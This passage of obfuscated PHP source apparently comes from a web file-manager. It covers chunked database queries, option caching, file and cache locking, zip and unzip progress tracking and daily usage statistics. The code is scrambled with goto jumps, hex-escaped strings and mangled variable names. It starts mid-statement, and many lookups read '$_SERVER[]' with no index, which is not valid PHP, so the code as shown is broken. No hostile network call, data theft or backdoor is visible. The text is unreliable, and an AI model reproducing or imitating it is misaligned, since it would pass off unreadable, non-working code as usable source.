$Fɿ); $eÖҘ .= "\x20\105\x4e\x44\x20\x20\x57\x48\x45\x52\x45\x20{$Fγ[0]}\40\111\116\40\50{$E}\51\x20"; $this->execute($eÖҘ); goto FĦ; FĦ: $d푸 = 0; $eÖҘ = $a¬; $this->chunkEventCheck(count($Fɿ)); goto A܋; A܋: $Fɿ = array(); goto bᘎ; bᘎ: } } goto CڞϢ; eĉ: $bȐô = is_array($bȐô) ? $bȐô : array(); $eÖҘ = $C[376]; $d푸 = 0; goto AԂĜ; b: $C =& $_SERVER[]; $B˿ = $this->tablePrefix . $this->tableName; $bև = self::SQL_WHERE_IN_CHUNK; goto eĉ; d§: } public function saveAllEach($eɋ) { $d쓍 =& $_SERVER[]; $fͿ = $this->tablePrefix . $this->tableName; foreach ($eɋ as $F˱Ȃ) { if (!is_array($F˱Ȃ) || count($F˱Ȃ) != 4) { continue; } $Ạ = $F˱Ȃ[0] . $d쓍[377] . $F˱Ȃ[1] . $d쓍[116]; $b̺ = $F˱Ȃ[2] . $d쓍[377] . $F˱Ȃ[3] . $d쓍[116]; $f = "\x75\x70\x64\141\x74\145\40{$fͿ}\x20\x73\x65\164\40{$b̺}\x20\167\x68\145\x72\x65\x20{$Ạ}\x3b"; $this->execute($f); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($B = false, $d¸섋 = false) { $this->_chunkEvent = $B; $this->_chunkEventParam = $d¸섋; } private function chunkEventCheck($bǎ) { if (!$this->_chunkEvent) { return; } $cǸ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $cǸ[$_SERVER[][378]] = $bǎ; Hook::trigger($this->_chunkEvent, $cǸ); } public function addAll($c𐶗, $B = array(), $c߫ = false) { goto bňד; D⢻: if (method_exists($this->db, $b׫К[270])) { for ($dח = 0; $dח < count($c𐶗); $dח += $b) { $F = array_slice($c𐶗, $dח, $b); if (!is_array($F) || count($F) == 0) { break; } $B˛ = $this->db->insertAll($F, $B, $c߫); $this->chunkEventCheck(count($F)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($c𐶗 as $cԃ => $F) { $B˛ = $this->db->insert($F, $B, $c߫); } $this->commit(); } if (!1 !== $B˛) { $d閬 = $this->getLastInsID(); if ($d閬) { return $d閬; } } return $B˛; goto dܴ; a퍑: if (empty($c𐶗)) { $this->error = think_lang($b׫К[269]); return !1; } $B = $this->_parseOptions($B); foreach ($c𐶗 as $cԃ => $F) { $c𐶗[$cԃ] = $this->_facade($F); $this->_beforeInsert($c𐶗[$cԃ], $B); } goto D⢻; bňד: $b׫К =& $_SERVER[]; ignore_timeout(); $b = self::SQL_WHERE_IN_CHUNK; goto a퍑; dܴ: } public function save($aƶ = '', $aĆ = array()) { goto Fеʂ; E̷݌: $d讯 = $this->findWhereField($Fӑ䵧); if (!$d讯) { return parent::save($aƶ, $aĆ); } $d = 0; goto f͕; Fеʂ: $dȐ =& $_SERVER[]; $A = self::SQL_WHERE_IN_CHUNK; $Fӑ䵧 = $this->optionsValue(); goto E̷݌; f͕: $Eǰ = $Fӑ䵧[$dȐ[273]][$d讯][1]; $Eǰ = is_array($Eǰ) ? $Eǰ : array(); $E𣜊 = count($Eǰ); goto Fϛ; Fϛ: for ($Aཌྷ = 0; $Aཌྷ < $E𣜊; $Aཌྷ += $A) { $dΤ = array_slice($Eǰ, $Aཌྷ, $A); if (!is_array($dΤ) || count($dΤ) == 0) { break; } $Fӑ䵧[$dȐ[273]][$d讯][1] = $dΤ; $this->optionsValue($Fӑ䵧); $d += parent::save($aƶ, $aĆ); $this->chunkEventCheck(count($dΤ)); } $this->chunkEventSet(); return $d; goto D; D: } public function add($c = '', $dҶ = array(), $a¾ = false) { if ($this->addTaskStatus && is_array($c)) { $this->addTaskData[] = $c; return; } return parent::add($c, $dҶ, $a¾); } public function parseWhereLike($E, $F = '', $eʼ = false, &$cû럢 = false) { goto a; a: $D =& $_SERVER[]; $c = $GLOBALS[$D[6]][$D[379]]; if (!$c[$D[380]]) { return $E; } goto FǊʟ; FǊʟ: if (!is_array($E)) { return $E; } $c = array(); $Bɔܨ = 0; goto D; D: foreach ($E as $EƖ => $F򊮘) { if (is_array($F򊮘) && count($F򊮘) == 2 && $F򊮘[0] == $D[381] && is_string($F򊮘[1]) && substr($F򊮘[1], 0, 1) == $D[382] && substr($F򊮘[1], strlen($F򊮘[1]) - 1, 1) == $D[382]) { goto fӔ; fӔ: $cû럢 = !0; $F = is_string($EƖ) ? $EƖ : $F; $BՆ؋ = substr($F򊮘[1], 1, strlen($F򊮘[1]) - 2); goto f৴; f͝Ӌ: if ($c[$D[384]]) { $A֔ = $D[385] . $BՆ؋ . $D[386]; if ($c[$D[387]]) { $A֔ = $D[386] . $BՆ؋ . $D[385]; } } $c[$Bɔܨ] = $D[388] . $F . $D[389] . $A֔ . $D[390]; $Bɔܨ++; goto dѳ࣭; dѳ࣭: continue; goto Aܦђү; f৴: $BՆ؋ = $this->db->escapeString($BՆ؋); if (!strpos($F, $D[95])) { $F = $D[383] . $F . $D[383]; } $A֔ = $D[182] . $BՆ؋ . $D[182]; goto f͝Ӌ; Aܦђү: } if (is_array($F򊮘)) { $F = is_string($EƖ) ? $EƖ : $F; $F򊮘 = $this->parseWhereLike($F򊮘, $F, !0, $cû럢); } if (is_numeric($EƖ)) { $c[$Bɔܨ] = $F򊮘; $Bɔܨ++; } else { $c[$EƖ] = $F򊮘; } } if ($cû럢 && !$eʼ) { } return $c; goto B; B: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($A̕ = array()) { goto c; B: $F呙 = $this->findWhereField($dフ); if (!$F呙 || isset($dフ[$Eݭ[290]]) || isset($dフ[$Eݭ[351]])) { return parent::select($A̕); } $d똋 = $dフ[$Eݭ[273]][$F呙][1]; goto Fǒ; Fǒ: $d똋 = is_array($d똋) ? $d똋 : array(); $a = null; for ($dш􍅗 = 0; $dш􍅗 < count($d똋); $dш􍅗 += $fஂ) { $bɝ򏽠 = array_slice($d똋, $dш􍅗, $fஂ); if (!is_array($bɝ򏽠) || count($bɝ򏽠) == 0) { break; } $dフ[$Eݭ[273]][$F呙][1] = $bɝ򏽠; $this->optionsValue($dフ); $bނ = parent::select($A̕); if (!$bނ) { continue; } $a = is_array($a) ? $a : array(); $a = array_merge($a, $bނ); } goto E됌; c: $Eݭ =& $_SERVER[]; $fஂ = self::SQL_WHERE_IN_CHUNK; $dフ = $this->optionsValue(); goto B; E됌: return $a; goto E; E: } public function delete($fȆ = array()) { goto E; E: $d⸟ݪ =& $_SERVER[]; $AŅ = self::SQL_WHERE_IN_CHUNK; $bɜ = $this->optionsValue(); goto B; B: $a񈉵 = $this->findWhereField($bɜ); if (!$a񈉵) { return parent::delete($fȆ); } $Fު = 0; goto Fճ; Fճ: $fý = $bɜ[$d⸟ݪ[273]][$a񈉵][1]; $fý = is_array($fý) ? $fý : array(); for ($a᷒ = 0; $a᷒ < count($fý); $a᷒ += $AŅ) { $f띫 = array_slice($fý, $a᷒, $AŅ); if (!is_array($f띫) || count($f띫) == 0) { break; } $bɜ[$d⸟ݪ[273]][$a񈉵][1] = $f띫; $this->optionsValue($bɜ); $Fު += parent::delete($fȆ); } goto E֟; E֟: return $Fު; goto f; f: } private function findWhereField($C) { $E =& $_SERVER[]; $D̐옉 = self::SQL_WHERE_IN_CHUNK; if (!is_array($C) || !is_array($C[$E[273]])) { return !1; } foreach ($C[$E[273]] as $f¤ܨ => $EË) { if (is_array($EË) && isset($EË[0]) && is_string($EË[0]) && strtolower($EË[0]) == $E[7] && is_array($EË[1]) && count($EË[1]) > $D̐옉) { ignore_timeout(); return $f¤ܨ; } } return !1; } public function setMasterDB($B笚 = true) { think_config($_SERVER[][391], $B笚); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\145\x6d\x4f\x70\x74\151\x6f\156"; public $field = array(); public function listData($dա = false, $Aϫ = "\x6d\x6f\x64\x69\146\171\x54\x69\155\x65", $F = false) { $E = Model($this->modelType)->get(!1, $this->optionType, !0); $cݻ = array_values($E); if ($cݻ && $cݻ[0] && !is_array($cݻ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $E = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$E) { return $dա ? null : array(); } if (!$dա) { $E = array_filter(array_values($E)); return array_sort_by($E, $Aϫ, $F); } return $E[$_SERVER[][392] . $dա]; } public function insert($b) { goto f媴; aґ: $eʩ = $eʩ ? $eʩ : 0; $b[$e[395]] = ++$eʩ; $b[$e[194]] = time(); goto c༶ҍ; Aֳ: return $eʩ; goto f; c༶ҍ: $b[$e[84]] = time(); Model($this->modelType)->set($e[393], $eʩ, $this->optionType . $e[394]); Model($this->modelType)->set($e[392] . $eʩ, $b, $this->optionType); goto Aֳ; f媴: $e =& $_SERVER[]; $b = array_field_key($b, $this->field); $eʩ = Model($this->modelType)->get($e[393], $this->optionType . $e[394]); goto aґ; f: } public function update($b䙒ń, $Dٺ) { goto C; C: $BȂ =& $_SERVER[]; $Dٺ = array_field_key($Dٺ, $this->field); $Aֹ = $this->listData($b䙒ń); goto D; D: if (!$Aֹ || !$b䙒ń) { return !1; } $Dٺ = array_merge($Aֹ, $Dٺ); $Dٺ[$BȂ[84]] = time(); goto c־; c־: return Model($this->modelType)->set($BȂ[392] . $b䙒ń, $Dٺ, $this->optionType); goto A쭰; A쭰: } public function remove($bܔ) { if (!$bܔ) { return !1; } return Model($this->modelType)->remove($_SERVER[][392] . $bܔ, $this->optionType); } public function clear() { $e =& $_SERVER[]; Model($this->modelType)->remove($e[393], $this->optionType . $e[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($d翅, $aⳎǧ) { if (!$aⳎǧ) { return !1; } $BζǞ = $this->listData(); $BζǞ = array_to_keyvalue($BζǞ, $d翅); return isset($BζǞ[$aⳎǧ]) ? $BζǞ[$aⳎǧ] : !1; } public function findByName($a) { return $this->findByKey($_SERVER[][28], $a); } protected function resetData($Aœ) { $E =& $_SERVER[]; $Aœ = is_array($Aœ) ? $Aœ : array(); $fކ = array(); for ($Fꌆ = 0; $Fꌆ < count($Aœ); $Fꌆ++) { $fކ[$E[392] . $Aœ[$Fꌆ][$E[395]]] = $Aœ[$Fꌆ]; } return Model($this->modelType)->set($fކ, !1, $this->optionType); } private function getAutoName($dÒ) { $Bɜ = array_to_keyvalue($this->listData(), $_SERVER[][28]); if (!$Bɜ || !isset($Bɜ[$dÒ])) { return $dÒ; } for ($c𾡒 = 1; $c𾡒 < count($Bɜ); $c𾡒++) { $D = $dÒ . "\x28{$c𾡒}\51"; if (!isset($Bɜ[$D])) { return $D; } } return $D; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Bф = false, $d澓 = '', $Eӳ = false) { goto e̟; b: $bה = $this->where($c)->select(); $bה = array_to_keyvalue($bה, $C[93], $C[372]); foreach ($bה as $CӜ => $Cۗ) { if ($Eӳ || in_array($CӜ, $this->jsonField)) { $bה[$CӜ] = json_decode($Cۗ, !0); } } goto f; f: $this->cacheSet($d澓, $bה); $bה = array_merge($FݰĔ, $bה); return $Bф ? $bה[$Bф] : $bה; goto cߑ; e̟: $C =& $_SERVER[]; $bה = $this->cacheGet($d澓); $FݰĔ = $this->optionDefault($d澓); goto fՅ; fՅ: $FݰĔ = is_array($FݰĔ) ? $FݰĔ : array(); if (is_array($bה)) { $bה = array_merge($FݰĔ, $bה); return $Bф ? isset($bה[$Bф]) ? $bה[$Bф] : null : $bה; } $c = $this->filterWhere(array($C[29] => $d澓)); goto b; cߑ: } public function set($A, $d͵ = false, $B쏑 = '') { goto f哽; B𖤷: $Ḁ = is_array($A) ? $A : array($A => $d͵); foreach ($Ḁ as $e => $E쒌) { if (is_array($E쒌)) { $E쒌 = json_encode_force($E쒌); } $this->checkLength($E쒌, !1, $this->tableName . $fۮ[4] . $A); $E쒌 = self::textEncode($E쒌); $Ḁ = array($fۮ[29] => $B쏑, $fۮ[93] => $e, $fۮ[372] => $E쒌); $d[] = $this->filterWhere($Ḁ); } if (!$d) { return !0; } goto B; B: return $this->addAll($d, array(), !0); goto Eї; f哽: $fۮ =& $_SERVER[]; $this->cacheRemove($B쏑); $d = array(); goto B𖤷; Eї: } protected function optionDefault($c = '') { return !1; } public function setDeep($d錎, $B = false, $Aչ = '') { $D󨑥 = explode($_SERVER[][95], $d錎); $aɹ = $this->get(); array_set_value($aɹ, $d錎, $B); $this->set($D󨑥[0], $aɹ[$D󨑥[0]], $Aչ); } public function remove($B, $b̄ = '') { $Eݭ =& $_SERVER[]; $this->cacheRemove($b̄); $cׄʊ = $this->filterWhere(array($Eݭ[93] => $B, $Eݭ[29] => $b̄)); if (is_null($B)) { unset($cׄʊ[$Eݭ[93]]); } return $this->where($cׄʊ)->delete(); } public function cacheSet($EЅ, $ḃ = false) { return Cache::set($this->cacheKey($EЅ), $ḃ); } public function cacheGet($b) { return Cache::get($this->cacheKey($b)); } public function cacheRemove($e̼Đ) { return Cache::remove($this->cacheKey($e̼Đ)); } protected function filterWhere($b嵡) { return $b嵡; } protected function cacheKey($D͇軧) { return $D͇軧; } } goto Eλױ; E妠: define($_SERVER[][237], 2); define($_SERVER[][238], 3); define($_SERVER[][239], 1); goto cɽ; D΋: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto aϽ; B㰮: if ($D == $A[17] && $FΒ == $A[9]) { $D = $A[193]; } switch ($D) { case $A[814]: self::$handle = new CacheLockRedis(); break; case $A[815]: self::$handle = new CacheLockMemcached(); break; case $A[17]: self::$handle = new CacheLockDatabase(); break; case $A[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto a֗; aϽ: $A =& $_SERVER[]; if (self::$handle) { return self::$handle; } $f = $GLOBALS[$A[6]][$A[347]]; goto fԵ; fԵ: self::$timeout = $f[$A[824]] ? $f[$A[824]] : 10; $FΒ = _get($GLOBALS[$A[6]], $A[825]); $D = $f[$A[811]] ? $f[$A[811]] : $A[193]; goto B㰮; a֗: } private static function key($cѧ) { return $_SERVER[][826] . Cache::key($cѧ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($DȘ = '') { self::$errorMsg = $DȘ; } public static function lockGlobal($e, $eι) { return self::lock($e, $eι, !0); } public static function lock($fʉё, $B֔ = false, $Fߪ܍ = false) { goto aݗ; aݗ: $E =& $_SERVER[]; $e = self::init(); $Cت = self::key($fʉё); goto c󅊧; c󅊧: $B֔ = $B֔ ? $B֔ : self::$timeout; $BŢ҆ˍ = $e->lock($Cت, $B֔); if (!$BŢ҆ˍ) { $Bٌ = "\154\157\143\153\x20\145\162\x72\157\x72\73\x6b\145\171\75{$fʉё}\73\x74\151\x6d\x65\x3d{$B֔}\73" . self::$errorMsg . $E[68] . get_caller_msg(); $A = LNG($E[827]) . "\x28{$B֔}\x73\51\56" . LNG($E[828]); $A .= $E[829]; if (is_string(self::$errorMsg) && self::$errorMsg) { $A = $A . $E[830] . self::$errorMsg; } write_log($Bٌ, $E[831]); show_json($A, !1); } goto Bى; Bى: if (!$Fߪ܍) { self::$lockItem[$Cت] = !0; } return $BŢ҆ˍ; goto aՆ; aՆ: } public static function lockGet($eǻ) { $A߾੠ = self::key($eǻ); if (self::$lockItem[$A߾੠]) { return self::$lockItem[$A߾੠]; } return self::init()->lockGet($A߾੠); } public static function unlock($c엸) { $F = self::key($c엸); self::$lockItem[$F] = null; return self::init()->unlock($F); } public static function unlockRuntime() { $f =& $_SERVER[]; $eٷŤ = self::init(); $e˹ŗ = !1; foreach (self::$lockItem as $E => $a) { if (!$a) { continue; } $eٷŤ->unlock($E); if (!$e˹ŗ) { $e˹ŗ = !0; write_log($f[832] . $E . $f[68] . get_caller_msg(), $f[831]); continue; } write_log($f[832] . $E, $f[831]); } self::fileUnlockAll(); } public static function fileLock($F߂) { goto FĊ; d: return !1; goto Bǭ; b뒬: if (flock($E֞, LOCK_EX)) { return !0; } self::unlock($F߂); show_json($c[836], !1); goto d; FĊ: $c =& $_SERVER[]; if (!$GLOBALS[$c[833]]) { $GLOBALS[$c[833]] = array(); } $GLOBALS[$c[833]][$F߂] = !1; goto dȗ; dȗ: $E֞ = fopen(DATA_PATH . $F߂ . $c[834], $c[835]); if (!$E֞) { return !1; } $GLOBALS[$c[833]][$F߂] = $E֞; goto b뒬; Bǭ: } public static function fileUnlock($A) { $D貞݄ =& $_SERVER[]; $E = $GLOBALS[$D貞݄[833]][$A]; if (!$E) { return; } $GLOBALS[$D貞݄[833]][$A] = !1; flock($E, LOCK_UN); fclose($E); } public static function fileUnlockAll() { $d뜉 =& $_SERVER[]; if (!$GLOBALS[$d뜉[833]]) { return; } foreach ($GLOBALS[$d뜉[833]] as $b߬ => $e) { if (!$e) { continue; } $GLOBALS[$d뜉[833]][$b߬] = !1; flock($e, LOCK_UN); fclose($e); } $GLOBALS[$d뜉[833]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Fڂ =& $_SERVER[]; $ađ޵ = $GLOBALS[$Fڂ[6]][$Fڂ[347]]; self::$cachePath = $ađ޵[$Fڂ[193]][$Fڂ[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($fړ, $e = 0) { goto eᴣׯ; eᴣׯ: $aڈѾ =& $_SERVER[]; $F̴ = microtime(!0); $dş = $F̴ + $e + 0.0001; goto b; c֕: $this->unlock($fړ); return !1; goto D߉; b: $dο = rtrim(self::$cachePath, $aڈѾ[8]) . $aڈѾ[837] . md5($fړ) . $aڈѾ[834]; if (file_exists($dο) && filemtime($dο) && filemtime($dο) < time() - 10) { @unlink($dο); } do { if (file_exists($dο)) { cacheLockWait(); continue; } $Dص = fopen($dο, $aڈѾ[838]); if (!$Dص) { return !1; } $d̜ = flock($Dص, LOCK_EX | LOCK_NB); self::$caches[$fړ] = array($aڈѾ[839] => $Dص, $aڈѾ[193] => $dο); fwrite($Dص, $dş); clearstatcache(); if ($Dص && $d̜) { return !0; } cacheLockWait(); } while (microtime(!0) < $dş); goto c֕; D߉: } public function lockGet($F֌) { $Bݦ =& $_SERVER[]; $dҼ = rtrim(self::$cachePath, $Bݦ[8]) . $Bݦ[837] . md5($F֌) . $Bݦ[834]; return file_exists($dҼ); } public function unlock($cΔϞ) { goto B; aۃڒ: @flock($C[$dƌ[839]], LOCK_UN); @fclose($C[$dƌ[839]]); @unlink($C[$dƌ[193]]); goto bʩڕ; bʩڕ: unset(self::$caches[$cΔϞ]); goto DҢ; B: $dƌ =& $_SERVER[]; $C = self::$caches[$cΔϞ]; if (!$C) { return; } goto aۃڒ; DҢ: } } goto fħ׌; D۱: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto b; c錏ۮě: Hook::bind($eϘÞ[1106], array($this, $eϘÞ[1635])); $B =& $this->task; $B[$eϘÞ[1636]] = $eϘÞ[1111]; goto Aԗ; Aԗ: if (!$B[$eϘÞ[1449]]) { $B[$eϘÞ[1449]] = LNG($eϘÞ[1637]); } goto a׍; b: $eϘÞ =& $_SERVER[]; parent::startAfter(); Hook::bind($eϘÞ[1633], array($this, $eϘÞ[1634])); goto c錏ۮě; a׍: } protected function endAfter() { $bþֆ =& $_SERVER[]; parent::endAfter(); Hook::unbind($bþֆ[1633], array($this, $bþֆ[1634])); Hook::unbind($bþֆ[1106], array($this, $bþֆ[1635])); } public function updateAfter() { $cו =& $_SERVER[]; $c؆ =& $this->task; if (!$c؆[$cו[1039]] || !$c؆[$cו[740]]) { return; } if ($c؆[$cו[1636]] == $cו[1111]) { $bֻ = 0; if ($c؆[$cו[1592]]) { $bֻ = $c؆[$cו[1593]] / $c؆[$cו[1592]]; } $c؆[$cו[1547]] = $bֻ * 0.3; } else { if ($c؆[$cו[1636]] == $cו[311]) { $bֻ = $c؆[$cו[1053]] / $c؆[$cו[1039]]; $c؆[$cו[1547]] = 0.3 + $bֻ * 0.4; } else { if ($c؆[$cו[1636]] == $cו[107]) { $F˱ = 0; if ($c؆[$cו[1594]] == $cו[107]) { $F˱ = $c؆[$cו[1593]]; } $bֻ = ($c؆[$cו[1597]] + $F˱) / $c؆[$cו[740]]; $c؆[$cו[1547]] = 0.3 + 0.4 + $bֻ * 0.3; } } } if ($c؆[$cו[1547]] > 0) { $c = timeFloat() - $c؆[$cו[766]] - $c؆[$cו[1550]]; $c؆[$cו[1551]] = $c * (1 - $c؆[$cו[1547]]) / $c؆[$cו[1547]]; } } public function addFile($Aڞ) { goto b; E捔: $dէ[$eԏ[1041]] = $eԏ[1612]; $dէ[$eԏ[1594]] = $eԏ[1111]; $dէ[$eԏ[740]] = $Cͤ[$eԏ[78]]; goto B̟; cꖹ: $dէ[$eԏ[1590]] = $Cͤ[$eԏ[28]]; $dէ[$eԏ[1592]] = $Cͤ[$eԏ[78]]; $dէ[$eԏ[1593]] = 0; goto E捔; b: $eԏ =& $_SERVER[]; $dէ =& $this->task; $Cͤ = IO::info($Aڞ); goto cꖹ; B̟: $dէ[$eԏ[1039]] = 1; $A۽ㅃ = 0; $dէ[$eԏ[1601]] = array($eԏ[1602] => $A۽ㅃ + 1, $eԏ[415] => $Cͤ[$eԏ[28]], $eԏ[76] => $Cͤ[$eԏ[76]], $eԏ[513] => $Cͤ[$eԏ[513]] ? $Cͤ[$eԏ[513]] : $Cͤ[$eԏ[76]]); goto FŅ; FŅ: $this->update(); goto C霉Ǳ; C霉Ǳ: } public function unzipAfter($fɻ) { goto fְ䗡; e: $Cȇ = IO::infoWithChildren($fɻ); $E͏ɣ = 0; $Dِͪ[$F[1601]] = array($F[1602] => $E͏ɣ + 1, $F[415] => $Cȇ[$F[28]], $F[76] => $Cȇ[$F[76]], $F[513] => $Cȇ[$F[513]] ? $Cȇ[$F[513]] : $Cȇ[$F[76]]); goto aμ; d務: $this->update(); self::log($F[1638] . json_encode(array($Dِͪ, $Cȇ))); goto Eֱ; aμ: if ($Cȇ[$F[29]] == $F[193]) { $Dِͪ[$F[1039]] = 1; } else { $Dِͪ[$F[1039]] = $Cȇ[$F[81]][$F[79]]; } $Dِͪ[$F[1041]] = $F[33]; $Dِͪ[$F[1594]] = 0; goto a鯥; fְ䗡: $F =& $_SERVER[]; $Dِͪ =& $this->task; $Dِͪ[$F[1636]] = $F[107]; goto e; c᥮: $Dِͪ[$F[1590]] = $F[33]; $Dِͪ[$F[1597]] = 0; $Dِͪ[$F[740]] = $Cȇ[$F[78]]; goto d務; a鯥: $Dِͪ[$F[1053]] = 0; $Dِͪ[$F[1592]] = 0; $Dِͪ[$F[1593]] = 0; goto c᥮; Eֱ: } public function nameParse($c盫) { goto d; A: $fɷ = get_path_this($c盫); if (strstr($fɷ, $D뽈[95])) { $a˴[$D뽈[1053]] += 1; $a˴[$D뽈[1039]] += 1; } $a˴[$D뽈[1590]] = $c盫; goto Bߕ; d: $D뽈 =& $_SERVER[]; $a˴ =& $this->task; if ($a˴[$D뽈[1636]] == $D뽈[1111]) { $a˴[$D뽈[1636]] = $D뽈[311]; $a˴[$D뽈[1597]] = 0; $a˴[$D뽈[740]] = 0; } goto A; Bߕ: $this->update(); goto bڷ; bڷ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $C =& $_SERVER[]; parent::startAfter(); Hook::bind($C[1639], array($this, $C[1634])); $D팚 =& $this->task; $D팚[$C[1636]] = $C[1111]; if (!$D팚[$C[1449]]) { $D팚[$C[1449]] = LNG($C[1640]); } } protected function endAfter() { $b͸ =& $_SERVER[]; parent::endAfter(); Hook::unbind($b͸[1639], array($this, $b͸[1634])); } public function updateAfter() { $Dˑ̴ =& $_SERVER[]; $Dة =& $this->task; if (!$Dة[$Dˑ̴[1039]] || !$Dة[$Dˑ̴[740]]) { return; } if ($Dة[$Dˑ̴[1636]] == $Dˑ̴[1111]) { $E׌ = $Dة[$Dˑ̴[1593]]; if ($Dة[$Dˑ̴[1594]] != $Dˑ̴[1111]) { $E׌ = 0; } $Cղ = ($Dة[$Dˑ̴[1597]] + $E׌) / $Dة[$Dˑ̴[740]]; $Dة[$Dˑ̴[1547]] = $Cղ * 0.3; } else { if ($Dة[$Dˑ̴[1636]] == $Dˑ̴[311]) { $Cղ = $Dة[$Dˑ̴[1053]] / $Dة[$Dˑ̴[1039]]; $Dة[$Dˑ̴[1547]] = 0.3 + $Cղ * 0.5; } else { if ($Dة[$Dˑ̴[1636]] == $Dˑ̴[107]) { $Cղ = 0; if ($Dة[$Dˑ̴[1592]]) { $Cղ = $Dة[$Dˑ̴[1593]] / $Dة[$Dˑ̴[1592]]; } $Dة[$Dˑ̴[1547]] = 0.3 + 0.5 + $Cղ * 0.2; } } } if ($Dة[$Dˑ̴[1547]] > 0) { $B = timeFloat() - $Dة[$Dˑ̴[766]] - $Dة[$Dˑ̴[1550]]; $Dة[$Dˑ̴[1551]] = $B * (1 - $Dة[$Dˑ̴[1547]]) / $Dة[$Dˑ̴[1547]]; } } public function copyFileStart($B, $dѮ, $eȼǅ؝, $D޲, $C͎, $E֔) { $fΟӟ =& $_SERVER[]; parent::copyFileStart($B, $dѮ, $eȼǅ؝, $D޲, $C͎, $E֔); $Cτ =& $this->task; if ($Cτ[$fΟӟ[1636]] == $fΟӟ[311]) { $Cτ[$fΟӟ[1636]] = $fΟӟ[107]; } $this->update(); } public function copyFileEnd($a, $cŚ, $A֖, $F, $dމ, $FǶ) { $aѪݝ =& $_SERVER[]; $Bמ· =& $this->task; $Bמ·[$aѪݝ[1593]] = $Bמ·[$aѪݝ[1592]]; $Bמ·[$aѪݝ[1597]] += $Bמ·[$aѪݝ[1592]]; $Bמ·[$aѪݝ[1594]] = $aѪݝ[33]; $this->update(); } public function nameParse($Cʺ) { $aȧ =& $_SERVER[]; $D =& $this->task; if ($D[$aȧ[1053]] < $D[$aȧ[1039]]) { $AΔ = get_path_this($Cʺ); if (strstr($AΔ, $aȧ[95])) { $D[$aȧ[1053]] += 1; } } if ($D[$aȧ[1636]] == $aȧ[1111]) { $D[$aȧ[1636]] = $aȧ[311]; } $D[$aȧ[1590]] = $Cʺ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($dۓ) { $f =& $_SERVER[]; $Cೌ = array($f[588] => array($f[29] => $f[1641], $f[271] => array($f[222], $f[742], $f[1642], $f[1643])), $f[1644] => array($f[29] => $f[1645], $f[271] => array($f[222], $f[740], $f[1646], $f[1647], $f[1648]))); if (!isset($Cೌ[$dۓ])) { return !1; } $this->optionType = $Cೌ[$dۓ][$f[29]]; $this->field = $Cೌ[$dۓ][$f[271]]; return !0; } public function listData($c = false, $F = "\x6d\x6f\x64\151\146\171\x54\151\x6d\x65", $f᧝ = false) { return parent::listData($c, $F, $f᧝); } public function trendList($C) { goto eވ; A겨: foreach ($aۥ as $cǋ) { $this->{$b}($cǋ); } return $this->listData(); goto bٰֈ; eވ: $F欇 =& $_SERVER[]; $aߝ = $this->listData(); if ($aߝ) { $Cӄ = end($aߝ); $cǋ = date($F欇[1649], strtotime($F欇[1650])); if ($Cӄ[$F欇[222]] == $cǋ) { return $aߝ; } $d = strtotime($Cӄ[$F欇[222]]); } goto fۯ; fۯ: if (!isset($d)) { $E = $C == $F欇[588] ? $F欇[532] : $F欇[809]; $d = Model($E)->min($F欇[194]); } $b = $F欇[1651] . ucfirst($C); $aۥ = $this->dateList($d); goto A겨; bٰֈ: } private function dateList($AמČ) { $Eϊ܊ =& $_SERVER[]; $b = $AמČ; $bƈֹ = strtotime($Eϊ܊[1650]); $f咞خ = array(); while ($b <= $bƈֹ) { $f咞خ[] = date($Eϊ܊[1649], $b); $b = strtotime($Eϊ܊[1652], $b); } return $f咞خ; } public function _recordUser($cܪ = '') { goto c堢ʷ; Dՙ: $C = array($eĄƭ[194] => array($eĄƭ[989], $f)); $A樗 = Model($eĄƭ[532])->where($C)->count($eĄƭ[1546]); $C[$eĄƭ[194]] = array($eĄƭ[331], array($FЄ, $f)); goto aւȪ; aւȪ: $c򇭣 = Model($eĄƭ[532])->where($C)->count($eĄƭ[1546]); $C[$eĄƭ[29]] = $eĄƭ[1655]; $c = Model($eĄƭ[1656])->where($C)->count($eĄƭ[1657]); goto c; c堢ʷ: $eĄƭ =& $_SERVER[]; $FЄ = strtotime(date($eĄƭ[1653], strtotime($cܪ))); $f = strtotime(date($eĄƭ[1654], strtotime($cܪ))); goto Dՙ; c: $dیۼ = array($eĄƭ[222] => $cܪ, $eĄƭ[742] => (int) $A樗, $eĄƭ[1642] => (int) $c򇭣, $eĄƭ[1643] => (int) $c); return $this->insert($dیۼ); goto b; b: } public function _recordStore($BȲ = '') { goto a׆; F䄙: $c = Model($b揎[809])->where($eꍖ)->sum($b揎[78]); $E = array($b揎[222] => $BȲ, $b揎[740] => (int) $Aҍ, $b揎[1646] => (int) $F, $b揎[1647] => (int) $b, $b揎[1648] => (int) $c); return $this->insert($E); goto F·˖; Fޡަ: $F = Model($b揎[464])->where($eꍖ)->sum($b揎[78]); $eꍖ[$b揎[405]] = 0; $Aҍ = Model($b揎[809])->where($eꍖ)->sum($b揎[78]); goto f¹; a׆: $b揎 =& $_SERVER[]; $Aԫ = strtotime(date($b揎[1654], strtotime($BȲ))); $eꍖ = array($b揎[194] => array($b揎[989], $Aԫ)); goto Fޡަ; f¹: $eꍖ[$b揎[406]] = 1; $b = Model($b揎[809])->where($eꍖ)->sum($b揎[78]); $eꍖ[$b揎[406]] = 2; goto F䄙; F·˖: } 